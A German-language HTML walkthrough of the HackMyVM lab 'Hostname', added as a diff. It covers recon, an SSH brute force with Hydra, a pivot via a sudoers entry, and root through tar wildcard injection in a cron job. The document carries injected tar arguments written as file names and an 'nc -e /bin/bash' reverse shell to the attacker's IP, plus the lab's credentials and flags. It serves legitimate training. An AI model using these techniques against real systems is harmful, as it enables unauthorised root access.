@@ -1,0 +1,588 @@
+﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hostname - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="header-bg">
+        <h1>Hostname - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <h2 style="color:green;">Easy</h2>
+            <div class="circle">
+                <div class="segment segment-1" style="background-color: green;"></div>
+                <div class="segment segment-2" style="background-color: green;"></div>
+                <div class="segment segment-3" style="background-color: green;"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">steghide</div>
+                <div class="tool-item">stegseek</div>
+                <div class="tool-item">stegsnow</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">nc</div>
+                <!-- Hier weitere Tools einfügen -->
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="comment">
+                In dieser Phase führen wir eine erste Aufklärung durch, um Informationen über das Zielsystem zu sammeln. Dies beinhaltet das Scannen des Netzwerks, um aktive Hosts zu identifizieren, und das Überprüfen offener Ports und Dienste.
+                <br>
+                <b>Analyse:</b> Die Reconnaissance ist entscheidend, um ein Verständnis der Netzwerkstruktur und der potenziellen Angriffsfläche zu gewinnen.
+                <br>
+                <b>Empfehlung:</b> Verwenden Sie verschiedene Tools und Techniken, um ein umfassendes Bild des Zielsystems zu erhalten.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+                        ┌──(root㉿cyber)-[~]<br>
+                        └─# <span class="command">arp-scan -l</span>
+                    </div>
+                </div>
+                <div class="terminal">
+                    192.168.2.112 08:00:27:69:3b:76 PCS Systemtechnik GmbH
+                </div>
+            </div>
+            <p class="comment">
+                <code>arp-scan -l</code> listet alle Geräte im lokalen Netzwerk auf. Hier sehen wir, dass sich ein Gerät mit der IP-Adresse 192.168.2.112 im Netzwerk befindet.
+                <br>
+                <b>Analyse:</b> ARP-Scan hilft, aktive Hosts im lokalen Netzwerk zu identifizieren. Die MAC-Adresse kann zur Geräteerkennung verwendet werden.
+                <br>
+                <b>Empfehlung:</b> Verwenden Sie ARP-Scan, um schnell einen Überblick über die aktiven Geräte im Netzwerk zu erhalten.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+                        ┌──(root㉿cyber)-[~]<br>
+                        └─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.112 -p-</span>
+                    </div>
+                </div>
+                <div class="terminal">
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-25 17:58 CEST<br>
+Nmap scan report for hostname (192.168.2.112)<br>
+Host is up (0.00012s latency).<br>
+Not shown: 65533 closed tcp ports (reset)<br>
+PORT   STATE SERVICE VERSION<br>
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)<br>
+| ssh-hostkey:<br>
+|   3072 27712458d37cb38a7b3249d1c80b4cba (RSA)<br>
+|   256 e23067387bdb9a8621013ebf0ee74f26 (ECDSA)<br>
+|_  256 5d78c537a858ddc4b6bdceb5babf53dc (ED25519)<br>
+80/tcp open  http    nginx 1.18.0<br>
+|_http-title: Panda<br>
+|_http-server-header: nginx/1.18.0<br>
+MAC Address: 08:00:27:69:3B:76 (Oracle VirtualBox virtual NIC)<br>
+Device type: general purpose<br>
+Running: Linux 4.X|5.X<br>
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>
+OS details: Linux 4.15 - 5.6<br>
+Network Distance: 1 hop<br>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>
+TRACEROUTE<br>
+HOP RTT     ADDRESS<br>
+1   0.12 ms hostname (192.168.2.112)
+                </div>
+            </div>
+            <p class="comment">
+                Nmap identifizierte die offenen Ports 22 (SSH) und 80 (HTTP). Der Hostname ist "hostname" und der HTTP-Titel ist "Panda".
+                <br>
+                <b>Analyse:</b> Nmap ist ein leistungsstarkes Tool zur Port- und Diensterkennung. Die Ergebnisse geben Aufschluss über die auf dem Zielsystem laufenden Dienste und deren Versionen.
+                <br>
+                <b>Empfehlung:</b> Überprüfen Sie die erkannten Dienste auf bekannte Schwachstellen und aktualisieren Sie sie gegebenenfalls.
+            </p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="comment">
+                Wir verwenden Gobuster, um versteckte Verzeichnisse und Dateien auf dem Webserver zu finden.
+                <br>
+                <b>Analyse:</b> Web Enumeration ist wichtig, um versteckte Inhalte und potenzielle Schwachstellen aufzudecken, die nicht direkt zugänglich sind.
+                <br>
+                <b>Empfehlung:</b> Verwenden Sie verschiedene Wordlists und Erweiterungen, um eine umfassende Suche durchzuführen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+                        ┌──(root㉿cyber)-[/home/cyber/Downloads]<br>
+                        └─# <span class="command">gobuster dir -u http://192.168.2.112 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,war,jse,jar,asp,aspx,csv,rtf,doc,docx,dsd,mp3,mp4,mkv,log,sh,dll,exe -t 100</span>
+                    </div>
+                </div>
+                <div class="terminal">
+http://192.168.2.112/index.php            (Status: 200) [Size: 1621]<br>
+http://192.168.2.112/assets               (Status: 403) [Size: 153]
+                </div>
+            </div>
+            <p class="comment">
+                Gobuster fand die Datei index.php und das Verzeichnis assets. Das Verzeichnis assets ist nicht zugänglich (Status 403).
+                <br>
+                <b>Analyse:</b> Gobuster hilft, versteckte Dateien und Verzeichnisse auf dem Webserver zu finden.
+                <br>
+                <b>Empfehlung:</b> Überprüfen Sie die Konfiguration des Webservers und stellen Sie sicher, dass keine unnötigen Dateien oder Verzeichnisse öffentlich zugänglich sind.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    http://192.168.2.112/index.php  <!-- Kung Fu Panda -->
+                </div>
+            </div>
+            <p class="comment">
+                Im Quellcode von index.php wurde ein Kommentar gefunden: "Kung Fu Panda".
+                <br>
+                <b>Analyse:</b> Kommentare im Quellcode können Hinweise auf die Funktionalität oder den Zweck der Anwendung geben.
+                <br>
+                <b>Empfehlung:</b> Überprüfen Sie alle Kommentare im Quellcode auf sensible Informationen.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+                        ┌──(root㉿cyber)-[~]<br>
+                        └─# <span class="command">echo "S3VuZ19GdV9QNG5kYQ" | base64 -d</span>
+                    </div>
+                </div>
+                <div class="terminal">
+Kung_Fu_P4nda
+                </div>
+            </div>
+            <p class="comment">
+                Der Base64-String "S3VuZ19GdV9QNG5kYQ" decodiert zu "Kung_Fu_P4nda".
+                <br>
+                <b>Analyse:</b> Base64-Strings werden oft verwendet, um Daten zu verschlüsseln oder zu kodieren.
+                <br>
+                <b>Empfehlung:</b> Decodieren Sie alle Base64-Strings im Quellcode, um potenzielle Informationen aufzudecken.
+            </p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="comment">
+                Wir versuchen, Informationen aus dem Bild bg.png zu extrahieren.
+                <br>
+                <b>Analyse:</b> Steganografie ist eine Technik, um Informationen in Bildern oder anderen Dateien zu verstecken.
+                <br>
+                <b>Empfehlung:</b> Verwenden Sie verschiedene Steganografie-Tools, um versteckte Informationen in Dateien zu finden.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+                        ┌──(root㉿cyber)-[~]<br>
+                        └─# <span class="command">steghide extract -sf bg.png</span>
+                    </div>
+                </div>
+                <div class="terminal">
+Passwort eingeben:<br>
+steghide: Mit diesem Passwort konnten keine Daten extrahiert werden!
+                </div>
+            </div>
+            <p class="comment">
+                Steghide konnte keine Daten mit dem falschen Passwort extrahieren.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+                        ┌──(root㉿cyber)-[~]<br>
+                        └─# <span class="command">stegseek bg.png /usr/share/wordlists/rockyou.txt</span>
+                    </div>
+                </div>
+                <div class="terminal">
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek<br><br>
+[i] Progress: 99.75% (133.1 MB)<br>
+[!] error: Could not find a valid passphrase.
+                </div>
+            </div>
+            <p class="comment">
+                Stegseek konnte keine gültige Passphrase finden.
+            </p>
+
+           <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+                        ┌──(root㉿cyber)-[~]<br>
+                        └─# <span class="command">stegsnow -C bg.png</span>
+                    </div>
+                </div>
+                <div class="terminal">
+#
+                </div>
+            </div>
+               
+           
+            
+
+            <p class="comment">
+                Wir versuchen, uns per SSH anzumelden. Wir verwenden den Benutzernamen "panda" und die Wordlist rockyou.txt, um das Passwort zu bruteforcen.
+                <br>
+                <b>Analyse:</b> Brute-Force-Angriffe können verwendet werden, um Passwörter zu knacken.
+                <br>
+                <b>Empfehlung:</b> Verwenden Sie starke und eindeutige Passwörter, um sich vor Brute-Force-Angriffen zu schützen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+                        ┌──(root㉿cyber)-[~]<br>
+                        └─# <span class="command">hydra -l panda -P /usr/share/wordlists/rockyou.txt ssh://panda.hmv -I -T 64</span>
+                    </div>
+                </div>
+                <div class="terminal">
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * ignore laws and ethics anyway).<br><br>
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-25 18:05:45<br>
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>
+[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore<br>
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344412 login tries (l:1/p:14344412), ~896526 tries per task<br>
+[DATA] attacking ssh://panda.hmv:22/<br>
+[STATUS] 120.00 tries/min, 120 tries in 00:01h, 14344295 to do in 1992:16h, 13 active
+                </div>
+            </div>
+            <p class="comment">
+                Hydra ist noch nicht erfolgreich. Wir versuchen es mit dem Benutzernamen "po".
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+                        ┌──(root㉿cyber)-[~]<br>
+                        └─# <span class="command">hydra -l po -P /usr/share/wordlists/rockyou.txt ssh://panda.hmv -I -T 64</span>
+                    </div>
+                </div>
+                <div class="terminal">
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * ignore laws and ethics anyway).<br><br>
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-25 18:13:15<br>
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>
+[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore<br>
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344416 login tries (l:1/p:14344416), ~896526 tries per task<br>
+[DATA] attacking ssh://panda.hmv:22/<br>
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::<br>
+[22][ssh] host: panda.hmv   login: po   password: !ts-bl4nk<br>
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::<br>
+1 of 1 target successfully completed, 1 valid password found
+                </div>
+            </div>
+            <p class="comment">
+                Hydra hat das Passwort "!ts-bl4nk" für den Benutzer "po" gefunden.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+                        ┌──(root㉿cyber)-[~]<br>
+                        └─# <span class="command">ssh po@panda.hmv</span>
+                    </div>
+                </div>
+                <div class="terminal">
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::<br>
+po@panda.hmv's password: <span class="password">!ts-bl4nk</span><br>
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::<br>
+Linux hostname 5.10.0-13-amd64 #1 SMP Debian 5.10.106-1 (2022-03-17) x86_64<br><br>
+The programs included with the Debian GNU/Linux system are free software;<br>
+the exact distribution terms for each program are described in the<br>
+individual files in /usr/share/doc/*/copyright.<br><br>
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>
+permitted by applicable law.<br>
+po@hostname:~$
+                </div>
+            </div>
+            <p class="comment">
+                Wir haben uns erfolgreich per SSH als Benutzer "po" angemeldet.
+            </p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="comment">
+                Wir überprüfen, welche sudo-Rechte der Benutzer "po" hat.
+                <br>
+                <b>Analyse:</b> Sudo ermöglicht es Benutzern, Befehle mit den Rechten eines anderen Benutzers auszuführen.
+                <br>
+                <b>Empfehlung:</b> Beschränken Sie die sudo-Rechte auf das absolute Minimum, das für die Aufgaben des Benutzers erforderlich ist.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+                        po@hostname:~$ <span class="command">sudo -l</span>
+                    </div>
+                </div>
+                <div class="terminal">
+We trust you have received the usual lecture from the local System<br>
+Administrator. It usually boils down to these three things:<br><br>
+    #1) Respect the privacy of others.<br>
+    #2) Think before you type.<br>
+    #3) With great power comes great responsibility.<br><br>
+[sudo] password for po:<br>
+Sorry, user po may not run sudo on hostname.
+                </div>
+            </div>
+            <p class="comment">
+                Der Benutzer "po" darf keine sudo-Befehle ausführen.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+                        po@hostname:~$ <span class="command">cat /etc/passwd | grep bash</span>
+                    </div>
+                </div>
+                <div class="terminal">
+root:x:0:0:root:/root:/bin/bash<br>
+po:x:1000:1000::/home/po:/bin/bash<br>
+oogway:x:1001:1001::/home/oogway:/bin/bash
+                </div>
+            </div>
+            <p class="comment">
+                Wir überprüfen die vorhandenen Benutzer mit einer Bash-Shell. Wir finden den Benutzer "oogway".
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+                        po@hostname:~$ <span class="command">cat /etc/sudoers.d/po</span>
+                    </div>
+                </div>
+                <div class="terminal">
+po HackMyVM = (oogway) NPASSWD: /bin/bash
+                </div>
+            </div>
+            <p class="comment">
+                Der Benutzer "po" darf den Befehl /bin/bash als Benutzer "oogway" auf dem Host "HackMyVM" ohne Passwort ausführen.
+            </p>
+
+            <p class="comment">
+                Wir versuchen, den Befehl auszuführen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+                        po@hostname:~$ <span class="command">sudo -u oogway -h HackMyVM /bin/bash</span>
+                    </div>
+                </div>
+                <div class="terminal">
+sudo: unable to resolve host HackMyVM: Name or service not known
+                </div>
+            </div>
+            <p class="comment">
+                Der Hostname "HackMyVM" kann nicht aufgelöst werden. Wir versuchen es ohne Hostname.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+                        po@hostname:~$ <span class="command">sudo -u oogway /bin/bash</span>
+                    </div>
+                </div>
+                <div class="terminal">
+oogway@hostname:/home/po$
+                </div>
+            </div>
+            <p class="comment">
+                Wir haben erfolgreich eine Shell als Benutzer "oogway" erhalten.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+                        oogway@hostname:~$ <span class="command">cat user.txt</span>
+                    </div>
+                </div>
+                <div class="terminal">
+081ecc5e6dd6ba0d150fc4bc0e62ec50
+                </div>
+            </div>
+            <p class="comment">
+                Wir haben die user.txt-Datei gelesen.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+                        oogway@hostname:~$ <span class="command">find / -name *.txt 2>/dev/null</span>
+                    </div>
+                </div>
+                <div class="terminal">
+/home/oogway/user.txt
+                </div>
+            </div>
+            <p class="comment">
+                Wir suchen nach weiteren Textdateien.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+                        oogway@hostname:~$ <span class="command">find / -writable 2>/dev/null</span>
+                    </div>
+                </div>
+                <div class="terminal">
+/home/oogway<br>
+/home/oogway/.bash_history<br>
+/home/oogway/.bash_logout<br>
+/home/oogway/.profile<br>
+/home/oogway/.bashrc<br>
+/home/po/.bash_history<br>
+/usr/lib/systemd/system/cryptdisks-early.service<br>
+/usr/lib/systemd/system/hwclock.service<br>
+/usr/lib/systemd/system/cryptdisks.service
+                </div>
+            </div>
+            <p class="comment">
+                Wir suchen nach beschreibbaren Dateien.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+                        oogway@hostname:/opt/secret$ <span class="command">grep -lir "/opt/secret" / 2>/dev/null</span>
+                    </div>
+                </div>
+                <div class="terminal">
+/etc/crontab
+                </div>
+            </div>
+            <p class="comment">
+                Wir suchen nach Dateien, die den Pfad "/opt/secret" enthalten.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+                        oogway@hostname:/opt/secret$ <span class="command">cat /etc/crontab</span>
+                    </div>
+                </div>
+                <div class="terminal">
+# /etc/crontab: system-wide crontab<br>
+# Unlike any other crontab you don't have to run the `crontab`<br>
+# command to install the new version when you edit this file<br>
+# and files in /etc/cron.d. These files also have username fields,<br>
+# that none of the other crontabs do.<br><br>
+SHELL=/bin/sh<br>
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br>
+# Example of job definition:<br>
+# .---------------- minute (0 - 59)<br>
+# |  .------------- hour (0 - 23)<br>
+# |  |  .---------- day of month (1 - 31)<br>
+# |  |  |  .------- month (1 - 12) (or jan,feb,mar,apr ...)<br>
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7)<br>
+# |  |  |  |  |<br>
+# *  *  *  *  * user-name command to be executed<br>
+*  *    * * *   root 	cd /opt/secret/ && tar -zcf /var/backups/secret.tgz *<br>
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly<br>
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )<br>
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )<br>
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+                </div>
+            </div>
+            <p class="comment">
+                Die Datei /etc/crontab enthält einen Eintrag, der jede Minute ein Tar-Archiv des Verzeichnisses /opt/secret/ erstellt.
+            </p>
+
+            <p class="comment">
+                Wir nutzen die Cronjob-Schwachstelle aus, um Root-Rechte zu erlangen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+                        oogway@hostname:/opt/secret$ <span class="command">touch -- --checkpoint=1</span>
+                    </div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+                        oogway@hostname:/opt/secret$ <span class="command">touch -- "--checkpoint-action=exec=sh rs"</span>
+                    </div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+                        oogway@hostname:/opt/secret$ <span class="command">echo "nc -e /bin/bash 192.168.2.153 80" >rs</span>
+                    </div>
+                </div>
+            </div>
+
+            <p class="comment">
+                Wir richten einen Netcat-Listener ein.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+                        ┌──(root㉿cyber)-[~]<br>
+                        └─# <span class="command">nc -lvnp 80</span>
+                    </div>
+                </div>
+            </div>
+
+            <p class="comment">
+                Wir erhalten eine Root-Shell.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+listening on [any] 80 ...<br>
+connect to [192.168.2.153] from (UNKNWN) [192.168.2.112] 41662<br>
+id<br>
+uid=0(root) gid=0(root) groups=0(root)<br>
+ls<br>
+--checkpoint=1<br>
+--checkpoint-action=exec=sh rs<br>
+rs<br>
+cd /root<br>
+cat root.txt<br>
+d5806296126a30ceebeaa172ff9c9151
+                </div>
+            </div>
+
+            <p class="comment">
+                <b>Analyse:</b> Wir haben erfolgreich Root-Rechte erlangt, indem wir eine Cronjob-Schwachstelle ausgenutzt haben.
+                <br>
+                <b>Empfehlung:</b> Überprüfen Sie regelmäßig die Cronjobs auf dem System und stellen Sie sicher, dass sie sicher konfiguriert sind.
+            </p>
+        </section>
+
+        <section id="flags">
+            <h2>Flags</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    cat root.txt<br>
+                    d5806296126a30ceebeaa172ff9c9151
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    cat user.txt<br>
+                    081ecc5e6dd6ba0d150fc4bc0e62ec50
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <footer class="footer">
+        <p>Ben Chehade - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2024-01-09</p>
+    </footer>
+</body>
+</html>
